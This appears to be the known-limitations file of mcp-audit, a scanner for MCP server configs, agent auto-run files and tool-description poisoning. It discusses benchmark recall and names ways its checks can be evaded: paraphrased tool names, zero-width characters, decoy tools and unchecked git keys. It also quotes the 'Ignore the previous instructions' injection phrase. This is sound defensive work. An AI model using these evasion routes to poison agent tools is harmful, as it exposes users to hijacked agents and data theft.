# Known gaps and improvement areas

This document catalogs the known limitations of mcp-audit in its current prototype state. These are areas that need work before the tool is ready for production use by security practitioners. Contributions and feedback welcome.

## Known-acceptable security advisories

Tracked here when: (a) the vulnerability is transitive-only, (b) no patched version is available upstream, or (c) attack surface is narrow enough to accept pending a fix. Promoted to CHANGELOG Security section when a patch lands.

| Advisory | Package | Severity | Via | Exposure | Status |
|---|---|---|---|---|---|

---

## Recently resolved

- **CVE-2026-45409 — `idna` quadratic DoS bypass resolved** (2026-05-19): Surfaced `idna` as a direct dependency with `>=3.15` floor. `idna 3.15` was available on PyPI; lockfile now resolves to 3.15. Transitive path: `mcp` extra → `httpx` → `anyio` → `idna`. Dependabot alert #7 closed.

- **Paid-license infrastructure removed** (v0.2.0): Ed25519 key verification (`licensing.py`), license cache (`_license_cache.py`), feature-gate shim (`_gate.py`), key-issuance script (`scripts/generate_license.py`), bundled revocation list (`data/revoked.json`), and the `activate` / `license` CLI commands are all gone. mcp-audit is fully open source (Apache 2.0); every feature ships in every build. `cryptography` moved to the `[attestation]` optional extra because attestation's X.509 parser is its only remaining consumer.

- **`run_scan` and `run_scan_async` duplicated the full analysis pipeline** (fixed 2026-04-20): Both entry points re-implemented the same seven-step pipeline (per-server analyzers → rug-pull → toxic-flow → attack paths → rule engine → scoring → registry stats), which meant any new analyzer or pipeline bug fix had to be applied twice or one path would silently lag. Fix: extracted `_run_static_pipeline()` in `scanner.py` as the canonical pipeline implementation; both `run_scan` (sync) and `run_scan_async` (async, after live enumeration completes) delegate to it. The helper is synchronous — `run_scan_async` now completes any `--connect` live MCP enumeration *before* calling the pipeline, which produces the same set of findings as before (only the insertion order of runtime poisoning findings changed; no test asserts on that order). New tests `test_static_pipeline_documents_order`, `test_run_scan_delegates_to_static_pipeline`, and `test_run_scan_async_delegates_to_static_pipeline` in `tests/test_scanner.py` lock the delegation contract. Test count: 1105 → 1108.

- **`--no-score` leaked score into SARIF `run.properties`** (fixed 2026-04-16): When `--no-score` was passed, the SARIF formatter still included the grade/score properties block because score suppression only reached the terminal renderer. Fix: `cli.py` now nulls `result.score` after scanning and before any formatter is called.

- **Malformed JSON config silently swallowed** (fixed 2026-04-16): `mcp-audit scan --path /tmp/bad.json` (with invalid JSON content) produced "No security issues found" and exit 0. Fix: `cli.py` now checks `result.errors` for parse failures on user-specified paths, prints a `[red]Error:[/red]` line with the file path and parse error detail, and exits 2.

- **Missing LICENSE file** (fixed 2026-04-16): No LICENSE file existed in the repo. Fix: Apache 2.0 LICENSE created; `pyproject.toml` license field and classifiers aligned.

- **Missing CONTRIBUTING.md** (fixed 2026-04-16): No contributor guide existed. Fix: CONTRIBUTING.md added with development setup, code conventions, and PR requirements.

- **Placeholder strings throughout codebase** (fixed 2026-04-16): `yourusername`, `Your Name`, `you@example.com` appeared in `pyproject.toml`, `sarif.py`, `README.md`, `scripts/install.sh`, and `docs/enterprise-deployment.md`. Fix: all replaced with real values (`adudley78`, `Adam Dudley`, and a GitHub noreply author address).

- **Cryptography dependency pin excluded security fix versions** (fixed 2026-04-17): `cryptography>=42.0,<47.0` resolved to 44.0.3 which is still vulnerable to CVE-2026-26007 (missing EC public key subgroup validation, fixed 46.0.5) and CVE-2026-34073 (DNS name constraint bypass for peer names, fixed 46.0.6). Fix: lower bound raised to `>=46.0.6,<47.0`; lockfile now resolves to `cryptography==46.0.7`. Confirmed clean with `pip-audit` — zero findings.

- **`.gitignore` missing `.env` and `*.key` patterns** (fixed 2026-04-16): Contributors could accidentally commit secrets. Fix: `.env`, `.env.*`, `*.key`, `*.pem` added to `.gitignore`.

- **Unused imports (F401)** (fixed 2026-04-16): `config_parser.py` imported unused `Path`; `test_nucleus_output.py` imported unused `MachineInfo`. Fix: both removed.

- **31 pre-existing ruff errors** (fixed 2026-04-16): 29 × E501 (line too long) in analyzers, `config_parser.py`, `licensing.py`, `terminal.py`, `test_analyzers.py`; 1 × SIM102 (collapsible nested if) in `transport.py`; 1 × S108 (insecure temp path) in `test_analyzers.py`. Fix: all lines wrapped within 88 chars using implicit string concatenation; SIM102 collapsed into single `if` with `and`; S108 replaced with pytest `tmp_path` fixture. `ruff check src/ tests/` now returns zero errors.

- **22 files not passing `ruff format`** (fixed 2026-04-16): 10 source files and 12 test files had formatting inconsistencies (trailing commas, indentation, string join wrapping, blank lines after docstrings). Fix: `ruff format src/ tests/` applied; one exposed E501 in `nucleus.py` suppressed with `# noqa: E501` (Rich markup string). `ruff format --check src/ tests/` now returns zero files; `ruff check src/ tests/` remains clean.

- **Version string hardcoded in 6 locations** (fixed 2026-04-16): V-13 resolved. `__version__` is now defined once in `src/mcp_audit/__init__.py` via `importlib.metadata` with a dev-install fallback. All 6 consumer locations import from there. A consistency test verifies alignment.

- **Stale doc counts and claims** (fixed 2026-04-16): README test counts (546/517 → 845), registry count (43 → 57), CLAUDE.md test/command counts, and multiple docs inaccuracies corrected. SARIF score documentation in `docs/scoring.md` updated. Stale proxy-gate note in `docs/registry.md` removed. `docs/github-action.md` drift severity table and nonexistent `baseline import` command corrected. OSV.dev references in `docs/enterprise-deployment.md` removed (feature not implemented).

## Project-level config scan (TRUST-001)

~~**No check for MCP servers hidden in repository-level config files (TrustFall risk).**~~ **Resolved v0.12.0.**
`mcp-audit scan --project <dir>` walks the repository tree for project-level
MCP config files and emits `TRUST-001` (HIGH) for every server found.  The
full analyzer pipeline (credentials, poisoning, transport, supply-chain, auth)
runs on those servers too.

**Project scan coverage limits (v0.12.0).**

- **Confirmed project-level config paths** (7 patterns shipped; see `discovery.py`):
  `.mcp.json`, `.claude/settings.json`, `.claude/settings.local.json`,
  `.cursor/mcp.json`, `.cursor/settings.json`, `.vscode/mcp.json`,
  `.amazonq/mcp.json` (Amazon Q Developer, added 2026-09-08/STORY-0065; AWS
  official docs confirm `mcpServers` root key, same schema as Claude
  Code/Cursor).
- **Windsurf:** no project-level MCP config support (global-only
  `~/.codeium/windsurf/mcp_config.json`). Omitted intentionally.
- **Zed:** uses `"context_servers"` root key in `settings.json`. Different
  schema; omitted pending dedicated parser.
- **Continue.dev:** YAML-based `.continue/config.yaml`; JSON parser does not
  apply. Omitted.
- **`.cursor/settings.json` coverage uncertain:** Cursor's official docs
  confirm `.cursor/mcp.json` as the canonical project-level MCP file.
  `.cursor/settings.json` is included conservatively because some third-party
  documentation shows `mcpServers` under cursor settings. If confirmed
  false-positive-prone, the spec can be removed from `_PROJECT_CONFIG_SPECS`.
- **No pre-clone (remote URL) mode:** `--project` requires a local path. To
  scan a repo before cloning, checkout the relevant config paths manually.
- **Watcher integration out of scope:** `mcp-audit watch` does not watch
  project-level configs automatically; use `--project` in a manual step.

**Repo-planted IDE auto-execution files (TRUST-003, v0.16.0).** `scan
--project` now also flags `.vscode/tasks.json` tasks with `runOn: folderOpen`
and command-bearing `.vscode/settings.json` keys (and, since STORY-0090, a
plain `scan`/`check` reads both at the root of the working directory) — the persistence mechanism
used by the Keyv npm worm and Shai-Hulud "V.A.P.E" (2026; see
`docs/severity-framework.md`). Known boundary, not covered:

- **`.vscode/launch.json`** (debug configurations) can also carry a
  `preLaunchTask` or a `program`/`args` pointing at an arbitrary executable,
  triggered on debug-session start rather than folder open. Not walked.
- **JetBrains run configurations** (`.idea/runConfigurations/*.xml`,
  "Startup Tasks" / "before launch" hooks) are a different client family and
  schema entirely; out of scope until a JetBrains-family parser exists.
- **Cursor folder-open hooks:** Cursor's `.cursor/` surface is walked for MCP
  configs (`_PROJECT_CONFIG_SPECS`) but Cursor does not currently document a
  `tasks.json`-equivalent auto-run-on-open mechanism separate from VS Code's
  (which Cursor forks); if Cursor ships one, it needs the same treatment as
  `.vscode/tasks.json`.

**Other harnesses' auto-run files (TRUST-008) and settings that redirect API
traffic (CFHYG-007, HARNESS-007), STORY-0090.** Read under `scan --project`
(tree walk) and at the cwd root in a default `scan`/`check` (root only, no
walk). Known boundaries:

- **The default scan reads the cwd root only.** TRUST-003 and TRUST-008 files in
  subdirectories (a monorepo package's `.vscode/`, `.codex/`) are found by
  `scan --project`, not by a plain `scan`/`check`, and a scan run from the home
  directory skips the cwd-root check.
- **Version-dependent semantics are reported, not resolved.** mcp-audit does not
  read installed harness versions. Codex `notify` in a project config is reported
  HIGH although current Codex documentation says it is ignored there (older
  releases ran it outside the sandbox); Gemini `tools.enableHooks` alone is
  MEDIUM because it only mattered in 0.18–0.22, when hooks were off by default.
- **A hooks file that also switches hooks off** (`hooksConfig.enabled: false`,
  `tools.enableHooks: false`) still reports its hooks at HIGH; settings-layer
  precedence is not modelled.
- **Codex hooks:** only `command` handlers are read (`commandWindows` overrides
  and MCP-tool handlers are not). `[sandbox_workspace_write] network_access`,
  `notice.hide_full_access_warning`, profiles and `requirements.toml` are not
  checked. `.codex/rules` and Gemini `.gemini/policies/` are not read.
- **`.gemini/.env`** is reported whether or not it is committed (mcp-audit does
  not read git's index), so a developer's own gitignored file holding a key
  produces TRUST-008 MEDIUM and CRED-001. Only `KEY=value` lines are parsed;
  multi-line quoted values are not.
- **CRED-001 in `.gemini/.env` only catches the existing `SECRET_PATTERNS`.**
  Google API keys (the `AIza…` shape, and the newer `AQ.` keys) and OpenAI
  project keys (`sk-proj-…`) are not matched: neither format is stated in Google's
  or OpenAI's own documentation (checked 2026-10-25: Google Cloud API-key and
  Sensitive Data Protection docs, Firebase API-key docs; OpenAI's platform docs),
  only in third-party scanners and forum posts, so no pattern was added. Such a
  key still appears by name in TRUST-008's variable list.
- **`.claude/scheduled_tasks.json` and `.claude/workflows/`** are reported on
  presence; their contents (task prompts, workflow scripts) are not scanned for
  poisoning, and only top-level `.js` files in `workflows/` are listed. Codex
  "persistent goals" and goose recipes are not read.
- **CFHYG-007's variable list is closed:** the documented `ANTHROPIC_*BASE_URL`
  endpoint variables, `OPENAI_BASE_URL`, `GOOGLE_GEMINI_BASE_URL`,
  `GOOGLE_VERTEX_BASE_URL`, `HTTP_PROXY`, `HTTPS_PROXY`. `ALL_PROXY` and lowercase
  proxy names are not documented by Claude Code and are not checked; other
  `*_BASE_URL` names (usually application settings) are not checked. Loopback
  hosts are not reported. First-party hosts are the documented defaults only:
  Bedrock's `bedrock-runtime[-fips].<region>.amazonaws.com` and interface VPC
  endpoints, where `<region>` must have a region's shape (`us-east-1`,
  `us-gov-west-1`), so a claimable S3 bucket host such as
  `bedrock-runtime-fips.s3.amazonaws.com` is reported; Bedrock in AWS China regions
  (`amazonaws.com.cn`) is not documented and is reported. Foundry's
  `<resource>.services.ai.azure.com` accepts any resource name, including one an
  attacker created in their own Azure subscription. A URL is read both the way Node does (backslashes as `/` for
  http(s), any run of slashes skipped) and literally; a value is reported if
  either reading leaves first-party hosts, if it carries user info before `@`,
  or if it has no parsable host. Node's IDNA mapping and numeric IPv4 forms
  (`127.1`, `2130706433`) are not modelled; those values are reported rather
  than exempted. A corporate gateway or proxy committed to project
  settings is reported HIGH by design: the recommendation is managed or user
  settings, where a cloned repository cannot change it.
- **CFHYG-006 keeps its prefix test.** A server `env` with
  `ANTHROPIC_BASE_URL=https://api.anthropic.com.example.net` passes CFHYG-006
  (unchanged behaviour); CFHYG-007 adds an exact-host check for the settings
  `env` block only.
- **Duplicates under `scan --project .`:** TRUST-008 found by both the cwd check
  and the walk is reported once; CFHYG-007 and HARNESS-007, like HARNESS-001..006,
  appear once per discovery label (`claude-code-project` and `claude-code`).
- **Files over 2 MiB** are reported MEDIUM without being read.
- **Symlinked directories:** an auto-run file reached through a symlinked
  `.gemini/`, `.codex/`, `.claude/` or `.vscode/` is reported as TRUST-002 and not
  analysed, like a symlinked file. MCP config candidates (`.claude/settings.json`
  under a symlinked `.claude/`) are still read through the link, as before, so
  CFHYG-007 can report a settings file that lives outside the repository.
- **Cross-harness writes are not HOOK-002.** HOOK-002's path list (a Claude Code
  hook that writes an agent config file) does not yet include
  `.gemini/settings.json`, `.codex/config.toml` or `.codex/hooks.json`; the
  planted file itself is TRUST-008, but the hook that writes it is only
  CFHYG-005/HOOK-001.

**Git can run code (TRUST-006/TRUST-007, STORY-0089).** The repository's own
git configuration and hooks are read (never run) in a default `scan`/`check`
(the repository enclosing the current directory) and under `--project` (every
`.git` entry and nested bare repository the walk passes). Known boundaries:

- **Default scan checks only the enclosing repository.** Nested bare
  repositories and nested `.git` directories are found only by
  `scan --project`; the current-directory check does not walk the tree (the
  current directory may be `$HOME`).
- **The walk's skip list and depth cap apply.** A bare repository inside
  `node_modules/`, `build/`, `dist/`, `venv/`/`.venv/` or deeper than 8 levels
  is not found.
- **Attributes are not evaluated.** `filter.<driver>.*`, `diff.<driver>.*` and
  `merge.<driver>.driver` only run for files whose `.gitattributes`,
  `.git/info/attributes`, `core.attributesFile` or `attr.tree` select that
  driver; the finding fires on the key alone, which over-reports a driver
  nothing selects.
- **`includeIf` conditions are not evaluated** (every include is treated as
  active), and an include that resolves outside the scanned tree is reported
  (MEDIUM) but not read. Global and system git config (`~/.gitconfig`,
  `/etc/gitconfig`), `GIT_CONFIG_*` and `-c` overrides are the user's own and
  are not read.
- **The known-tool list assumes the tool on `PATH` is the real one.** A bare
  `git-lfs`, `git-crypt`, `nbstripout`, `cat`, `ssh`, `gh`, `gitsign`, text
  converter, editor or pager command run from outside the tree is INFO; a
  `PATH` that contains `.` or a repository directory (or old tool bugs like
  git-lfs CVE-2020-27955 on Windows) defeats that. Only the `git-lfs …` form is
  known: `git lfs …` is HIGH, because without git-lfs installed git runs
  `alias.lfs`, which the same config can define. A program path inside the
  tree is judged where it sits, not where a symlink points (a repository's
  `.venv/bin/python` symlink runs the repository's own `site-packages`): inside
  a Python environment with a `pyvenv.cfg` or `conda-meta/` it is MEDIUM,
  anywhere else in the tree it is the full severity. `python -m X` is the full
  severity when the repo root holds anything named `X` or `X.*` (`X.py`,
  `X.pyc`, `X/`, an extension module).
- **`bun` as a textconv is a deliberate HIGH.** `diff.lockb.textconv = bun`
  (how `bun.lockb` was diffed before Bun 1.2's text lockfile) runs
  `bun <file>`, and bun executes any `.js`/`.ts` file `.gitattributes` routes to
  that driver; text converters
  (`exiftool`, `pdftotext`, `pandoc`, `sops decrypt`, `unzip -c`, …) are INFO
  only when every argument is on that converter's allowlist of display options.
- **Known tools' own config is read for git-lfs and delta only.** git-lfs's
  `lfs.extension.<name>.clean`/`smudge` and `lfs.customtransfer.<name>.path`/`args`,
  and delta's `pager` (in `[delta]` or a `[delta "<feature>"]` section, whether
  or not that feature is enabled), are reported and take away the tool's INFO
  status. `lfs.standalonetransferagent` is not reported on its own (it names an
  agent, not a program); it raises the named agent's `path`/`args` from MEDIUM to
  HIGH (STORY-0103). Any `lfs.<url>.standalonetransferagent` counts, whichever
  URL it names, because which endpoint a remote resolves to is not known from
  config alone; a URL key that overrides the plain one for the real endpoint is
  not modelled. Not covered: delta's
  `diff-args` (used only when delta compares two files itself); git's
  `interactive.diffFilter` (delta's documented `git add -p` setup, run only on
  interactive add); git-annex's own `annex.*` settings, which can name programs,
  so a `git-annex` filter stays INFO whatever the `annex.*` section says; and
  config files tools read outside git config (`~/.ExifTool_config`, pandoc's
  data directory, `~/.gnupg`), which are the user's.
- **Known-tool argument allowlists can be too narrow.** A known tool given an
  option that is harmless but not on its list (`_ARG_SPECS` in
  `analyzers/git_exec.py`) keeps the key's full severity, for example
  `pandoc --toc`, `less -P<prompt>` or a `textconv` with a less common display
  flag. That is the deliberate trade: an over-report names the key and can be
  baselined, and every deny-list tried missed a way to load code (ExifTool's
  case-insensitive `-IF`/`-if2`, a pandoc Lua reader via `-f reader.lua`,
  attached `pandoc -o<path>`). A value that happens to equal the name of a file
  at the repository root (`pandoc -t plain` in a repo with a file called
  `plain`) is also treated as in-tree. ansible-vault is never known (its
  `view` reads an `ansible.cfg` from the repository root). The tools' own
  config files outside the repository (`~/.ExifTool_config`, `~/.gnupg`,
  pandoc's user data directory) are the user's, and are not read.
- **Legitimate shapes that still fire:** Watchman's fsmonitor integration
  when the hook is not an exact copy of a sample git shipped (an unmodified
  copy of any of the five versions git shipped from v2.16 to v2.56, matched
  by SHA-256, is INFO; a sample from a later git is HIGH until its digest is
  added, and `tests/test_git_exec.py` skips with the digest to add when a
  machine's git ships one; an edited or distro-patched copy stays HIGH,
  because a matching header proves nothing); VFS for Git's
  `post-index-change` hook (HIGH); transcrypt's `$(git rev-parse …)` filter
  commands (HIGH, shell substitution); the Android `repo` tool's
  `.repo/projects/*.git` directories under `--project` (TRUST-007). Each names
  the key or path, so it can be baselined.
- **Expected bare repositories are inventory.** Under `--project`, a bare
  repository in a test/fixture directory or a package manager's dependency
  cache (SwiftPM `.build/repositories/`, Bundler `cache/bundler/git/`, Cargo
  `.cargo/git/db/`, Go `pkg/mod/cache/vcs/`) is INFO when its config runs
  nothing and it has no `post-index-change` hook; otherwise HIGH. Other
  package managers' caches are not recognised.
- **Not covered:** `ext::` remote URLs with `protocol.ext.allow`,
  `url.<base>.insteadOf` rewrites, `http.proxy` (traffic redirection, not
  execution), `difftool`/`mergetool` `.cmd`, `trailer.<token>.cmd`, and
  `uploadpack.packObjectsHook` (git honours it only in protected config).
  Manifold withheld the second Claude Code key (the `ultrareview` path, "a
  different git setting of the same kind"); it is covered only if it is one of
  the keys in `analyzers/git_exec.py::_RULES`.
- **A config git itself rejects is still read.** Git refuses the whole file at
  its first syntax error, so its keys are inert for git; the finding keeps its
  severity and says so, because other git implementations may read it.
- **Reads are capped and budgeted.** 1 MiB per config file; per repository
  (its config, every include, and its worktree configs together) 4 MiB, 20,000
  entries and 256 followed includes. Anything past a cap is reported as a
  MEDIUM "too large to inspect fully", never silently dropped. Hooks and
  worktrees listings stop at 512 entries; include depth is git's own 10. An
  unexpected error in the git check is recorded in the scan's errors and the
  rest of the scan still runs.
- **Repository discovery follows git's rules**, including the quirks: a
  `.git` directory that is not a valid git directory is skipped and the search
  continues upward (so a decoy cannot hide the real repository); a malformed
  `.git` file, or one pointing at something that is not a git directory, ends
  the search with no findings, because git itself stops there and runs
  nothing.

**Symlinked config/agent-file candidates (TRUST-002/TRUST-004/TRUST-005,
2026-09-08/STORY-0065).** All nine discovery sites that used to silently
`continue` past a symlinked candidate (six in `discovery.py`, three in
`agent_files/discovery.py`) now include it and report it instead — coverage
is unaffected either way, since `Path.read_text()` follows a symlink
transparently. See
`humans/decisions/2026-09-08-trust-002-symlink-sites.md` (marcus repo) for
the full evasion/escape design. Known boundaries:

- **`--path <dir>` glob is one level deep, symlinked or not.** A directory
  passed via `--path` is globbed with `*.json` (no recursion); a symlinked
  *subdirectory* two levels down is neither walked nor reported. This is
  pre-existing, unrelated scope — the same one-level limit applied before
  this change and applies equally to non-symlinked nested directories.
- **A `--path <symlink>` pointing at a directory is treated as a single
  file-read candidate, not glob-expanded.** If the resolved target is
  actually a directory, `parse_config()` raises (caught, surfaced as a
  scan error) rather than transparently falling through to the directory-glob
  branch. This is an accepted edge case, not the shape the site-4 fix
  targeted (an explicit path symlinked to *a file*, the common case) — a
  `--path` argument symlinked straight to a directory is rare enough that
  building dual-mode resolution for it was not justified.
- **TRUST-002's "inside/outside root" boundary is computed with
  `Path.resolve()` on both sides**, so it is only as trustworthy as the
  filesystem at the moment of the scan — a TOCTOU race that swaps the
  symlink target between discovery and read is not defended against (the
  same class of gap every "check then read" pattern in this codebase has;
  MCP config scanning is not a privilege boundary this tool tries to
  enforce in real time).

---

## Tool-name collision detection (COLLIDE-001)

**Static collision detection is not possible.**  MCP config files (`mcp.json`,
`claude_desktop_config.json`, etc.) record how to *launch* or *connect to* a
server (command, args, URL) but do not declare the tool names the server
exposes.  Tool names are returned dynamically by the server at runtime via the
MCP `tools/list` response.  Without running the servers, there is no data to
compare.

As a result, `COLLIDE-001` requires `--connect`.  When `mcp-audit scan
--connect` successfully enumerates at least two servers, their live tool lists
are compared and any shared tool name is flagged.  A plain static scan produces
no COLLIDE-001 findings — this is correct behaviour, not a gap in the
detection logic.

**Known coverage limits:**

- **Only successfully connected servers are compared.**  If a server times out
  or returns an enumeration error, it is excluded from the collision index.
  A malicious server could refuse connections to avoid detection.
- **No Levenshtein / near-miss detection.**  Tool-name comparison is exact and
  case-sensitive.  `read_file` and `Read_File` are treated as distinct names.
  Near-miss shadowing (e.g. `readFile` vs `read_file`) is out of scope for v1.
- **No runtime enforcement or pinning.**  COLLIDE-001 is a detection-only
  finding; it does not prevent the agent from calling the wrong tool.

---

## Cross-tool delegation (DELEG-001..003, STORY-0100)

Measured before shipping (2026-10-26; method and every number in
[`docs/poisoning.md`](docs/poisoning.md#cross-tool-delegation-deleg-001003),
pinned in `docs/research/poisoning-benchmark/results.json` under `delegation`).
On MCPTox with the poisoned tool on its own server: POISON-* plus DELEG-* flag
99.4% of the 1,312 cases (97.8% of the 370 unwrapped implicit-trigger cases,
against 21.4% for POISON-* alone); DELEG-* flags 1 of the 353 clean tools. The
gate passed, so the stated severities ship.

**Known limits:**

- **Needs `--connect`.** Descriptions exist only in a live `tools/list`. The
  `tools` section of `mcp-lock.json` records names and SHA-256 digests, never
  text (`lock/tool_digests.py`), so a default scan, `check` and the GitHub
  Action never run these checks. EPIC-0007 described the lock as storing
  definitions; it stores their digests, and changing the lock format was out
  of scope.
- **The session is the servers that enumerated.** A server that fails to
  connect contributes no tool names, so a reference to its tools is not seen
  (the same limit as COLLIDE-001).
- **Same-server delegation is not flagged, by design.** DELEG-001 needs a
  tool of a *different* server, and DELEG-002 skips a sentence that names only
  the describing server's own tools (a server documenting its own workflow is
  the commonest benign shape on real servers). MCPTox's prompts list the
  poisoned tool among the target server's tools; in that layout POISON-* plus
  DELEG-* reach 23.5% of the unwrapped implicit cases, against 21.4% for
  POISON-* alone. DELEG-002 also counts what the describing server's other
  tools can do as its own, and DELEG-003's "every call" scope does not apply
  to an argument the server's own tools take, so a malicious server can mute
  both by adding decoy tools with those capabilities or argument names
  (DELEG-001 still fires on the cross-server name). A compromised server that poisons one of its own tools to
  misuse another of its own tools is in this gap; it already controls both.
- **Exact names only.** "The file-reading tool" instead of `read_file`
  evades DELEG-001; so does a name broken with zero-width characters or
  homoglyphs (POISON-040 and POISON-060 flag those characters). A plain-word
  tool name (`search`) counts only quoted and in tool context.
- **English vocabulary.** DELEG-002/003 match a closed English word list
  (trigger words, obligation words, action verbs by class). A tool's own
  capability is inferred from words in its name and input-schema property
  names, so a tool whose name says nothing about what it does can trip
  DELEG-002; a verb used as a noun ("emails", "post") counts as the verb.
  Non-English descriptions are not covered (MCPTox is English).
- **Tools only.** Resource and prompt descriptions, `outputSchema` and
  annotations are not read; schema `enum`/`default`/`examples` strings are not
  either.
- **What the measurement can and cannot say.** The 353 MCPTox clean tools (1
  flagged) and a first set of 640 real tool descriptions (statically read from
  the published npm source of 35 top-100 corpus servers; 1 flagged) both
  informed the design; only a second set of 215 descriptions from 3 more
  servers was held out until the design was frozen (0 flagged). That benign check is a
  one-off by hand (the third-party source is not committed), not a CI test.
  MCP-ITP's optimized implicit poisoning (arXiv 2601.07395) was not measured:
  no dataset was published.
- **Budgets.** 64 KiB of text per tool, 8 MiB per scan, 20,000 tools, schemas
  to 5,000 nodes and 64 levels. The scan budget is shared fairly across
  servers (the smallest demands are met in full, the rest split evenly), so
  one server cannot use it up for the others; anything beyond a server's
  share is not read and the scan's errors name the server. Evidence is redacted with `SECRET_PATTERNS` over the shown
  excerpt plus 1,000 characters either side, not the whole field (one of those
  patterns rescans to the end of its input from every start); a secret longer
  than that margin, starting outside it, could show in part.

---

## Authentication checks (AUTH-001 / AUTH-002)

~~**No check for unauthenticated remote MCP servers.**~~ **Resolved v0.12.0.**
`AUTH-001` in `analyzers/auth.py` flags remote (HTTP/SSE/Streamable-HTTP)
servers with no authentication material in their config. Severity is HIGH for
public hosts and MEDIUM for private (RFC 1918 / `*.local`) hosts. Localhost is
exempt. Fires for all supported clients: suppressed by any Authorization /
x-api-key / api-key header, token/apiKey/auth/bearer raw field, OAuth settings,
or URL userinfo. Research basis: arXiv 2605.22333 (40.55% of 7,973 live remote
MCP servers unauthenticated); Censys (12,520 internet-exposed MCP services).

**AUTH-002 coverage limits (v0.12.0).**
`AUTH-002` checks OAuth-configured servers for RFC 8707 audience/resource
binding, but OAuth config shapes vary significantly across MCP clients. The
check covers: `oauth`/`oauth2` dict blocks, `auth.type: oauth2` nested blocks,
and flat top-level `client_id` + `authorization_endpoint` co-occurrence. Formats
not matching these three patterns produce no finding (false negative tolerance is
intentional — prefer silence over noise for auth checks). Clients that store
OAuth config under non-standard root keys (e.g. `authorization` or a
vendor-specific key) will not be covered. Expand `_OAUTH_FIELD_NAMES` in
`analyzers/auth.py` as new patterns are confirmed by practitioner review.
Dynamic-client-registration flaws found in 96.6% of OAuth-enabled MCP servers
by arXiv 2605.22333 are out of scope for static analysis (require live
`/.well-known/oauth-authorization-server` fetch).

## Detection quality

**Measured POISON-* recall and precision (2026-10-25, STORY-0088).** Full method and caveats: [`docs/poisoning.md`](docs/poisoning.md); numbers: `docs/research/poisoning-benchmark/results.json`.

- **Recall on MCPTox** ([arXiv 2508.14925](https://arxiv.org/html/2508.14925v1), `response_all.json` SHA-256 `79a90049…41c03`, 1,312 valid cases): **74.5%** at any severity (P1 explicit trigger 79.3%, P2 implicit trigger 79.2%, P3 parameter tampering 68.7%); **69.2% at HIGH or above**, the threshold `check`, the pre-commit default and `--severity-threshold high` fail on. Every case carrying `<IMPORTANT>` or "Ignore the previous instructions" is caught at HIGH (877 of 877, by POISON-010/012). **Without a wrapper it is 23.2%, and 7.1% at HIGH or above** (435 cases: P1 33.8/12.3%, P2 39.3/7.9%, P3 4.7/4.7%); on the 485 unwrapped descriptions in `pure_tool.json` it is 24.9% and 7.0% (P1 40.3/10.4%, P2 41.5/7.1%, P3 6.2/5.8%). Cisco's YARA rules scored 20.8% on a split of the same 485 ([arXiv 2604.10534](https://arxiv.org/html/2604.10534v1)). MCPTox found the wrappers add 2.0–2.6% attack success, so the unwrapped numbers are the realistic ones. A plain `scan` exits 1 on any finding (default threshold INFO), so the any-severity column is what it reports.
- **Clean tools flagged on MCPTox:** 18 of 353 (5.1%), 16 of them at HIGH (4.5%): 16 POISON-060 on three servers whose descriptions are in Chinese, 2 POISON-050. This and the committed-fragment replay are the precision checks that re-run after a pattern change.
- **Precision on the top-100 npm corpus** (`docs/research/2026-10-top100-npm/`, live tools, mcp-audit 0.21.0): **0 of 661 findings real (0.0%)**, 0 of the 492 at HIGH or above, 41 findings per 100 tools. The earlier "661 of 661 false" count is confirmed. This is a fixed measurement of the 0.21.x code (`labelled_patterns_fingerprint` in `top100-labels.json`): re-measuring it after a pattern change needs a fresh enumeration of the corpus, which runs third-party servers and is never done in CI, so a pattern change refreshes only the committed-fragment replay and `precision` prints STALE. 488 labels (POISON-060) rest on committed evidence: the first matched character in each field was full-width Chinese punctuation. 173 (POISON-050 139, POISON-030 30, POISON-012 2, POISON-020 2) rest on the 2026-10-22 review of the full definitions, which are not committed, plus a 2026-10-25 read of 54 of the 60 connected servers' npm source.
- **Known limits of the measurement:** MCPTox is never committed (no stated licence) and CI never fetches it, so recall is re-measured by hand (`scripts/bench_poisoning.py recall --check`) before any release that changes `analyzers/poisoning.py` or `build_runtime_server_config`; agent instruction files and POISON-041/042 are not exercised by either corpus; MCPZoo's benign servers were not used (no download found); MCPTox is English only.
- **Pinned:** `tests/test_bench_poisoning.py` fingerprints the whole source of `analyzers/poisoning.py` and `build_runtime_server_config`, so any change to either forces a re-measure (CI fails until `results.json` is re-taken); it also fails when a pattern fires on a committed top-100 fragment it did not fire on before.
- **With `--connect`, DELEG-001..003 run beside POISON-* (STORY-0100)** and close most of the unwrapped gap on MCPTox when the poisoned tool sits on its own server: 97.8% of unwrapped implicit-trigger cases for both together, 95.8% for parameter tampering. See "Cross-tool delegation" above; the other numbers here are POISON-* alone.

**The 22-server false-positive benchmark covers config entries, not tool descriptions (2026-04-23; scoped 2026-10-25).** The poisoning analyzer produces zero findings on the configs of 12 official `@modelcontextprotocol/*` servers and 10 popular community servers. That is still true and still a regression test (`tests/test_false_positive_benchmark.py`), but those fixtures hold only `command`, `args` and `env`; none holds a tool description, so the benchmark says nothing about precision on what `--connect` reads. The measured numbers above do. Acceptable non-FP findings on legitimate servers: TRANSPORT-003 (runtime package fetch, expected for all npx/uvx servers), COMM-010 (npx without pinned version). Note: the "base64 encode" false positive from the filesystem server's runtime tool descriptions (fetched via `--connect`) is not covered by static analysis and remains a known limitation of the live connection path.

**Exploit validation suite added (2026-04-23).** Six published attack PoCs are now reconstructed as fixtures in `tests/fixtures/exploits/` and verified by `tests/test_exploit_validation.py`: Invariant Labs SSH exfiltration, CrowdStrike `add_numbers`, fake Postmark exfiltration, XML injection override, cloud credential exfiltration, and behavioral override stealth. All six are detected. Detection is based on static config analysis — whether these patterns cause real LLMs to follow injected instructions in production is a separate validation question that requires live red-team testing against actual agent deployments.

**Pattern coverage is thin.** The poisoning analyzer has 12 patterns (authoritative count: `len(PATTERNS)` in `analyzers/poisoning.py`, not the highest ID number — verified by `tests/test_release_notes_facts.py::test_poisoning_pattern_count_matches`, R51). The credential analyzer has 17 (`len(SECRET_PATTERNS)` in `analyzers/credentials.py`, same test module's `test_credential_pattern_count_matches`). Production secret scanners like truffleHog and detect-secrets use 700+ credential patterns. The poisoning patterns cover the most-cited attack techniques but will miss novel or obfuscated injection methods. Pattern count should grow based on practitioner feedback and new published research.

Partially confirmed closed (2026-05-17) via community rules seed pack (STORY-0044):
- Role-claim poisoning in server args → confirmed closed — see COMM-016
- Authority-claim / AI identity impersonation → confirmed closed — see COMM-017
- Output-format hijack instruction → confirmed closed — see COMM-018
- Side-channel data exfiltration instruction → confirmed closed — see COMM-019
- Confabulation / hallucination trigger → confirmed closed — see COMM-020
